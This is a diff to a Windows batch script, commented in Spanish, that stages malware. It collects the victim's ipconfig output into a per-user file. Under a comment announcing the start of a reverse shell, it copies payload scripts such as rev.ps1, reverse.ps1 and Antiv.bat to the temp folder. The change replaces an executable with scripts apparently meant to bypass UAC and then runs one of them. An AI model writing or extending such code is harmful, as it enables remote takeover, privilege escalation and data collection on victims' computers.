@@ -45,10 +45,10 @@ ipconfig /all >> %Destino%\%username%.txt
 
 :: Ejecución de script para empezar la reverse shell
 
-copy scripts\hola.bat %temp% /Y| copy scripts\hola.vbs %temp% /Y | copy scripts\rev.ps1 %temp% /Y | copy scripts\reverse.ps1 %temp% /Y | copy scripts\letsbefriends.exe %temp% /Y | copy scripts\Antiv.bat %temp% /Y | copy  scripts\Principal.bat %temp% /Y
+copy scripts\hola.bat %temp% /Y| copy scripts\hola.vbs %temp% /Y | copy scripts\rev.ps1 %temp% /Y | copy scripts\reverse.ps1 %temp% /Y | copy scripts\ByUac.ps1 %temp% /Y | copy scripts\ByUac.bat %temp% /Y | copy scripts\Antiv.bat %temp% /Y | copy  scripts\Principal.bat %temp% /Y
 
 c:
 
 cd %userprofile%\appdata\local\temp
 
-letsbefriends.exe
+ByUac.bat
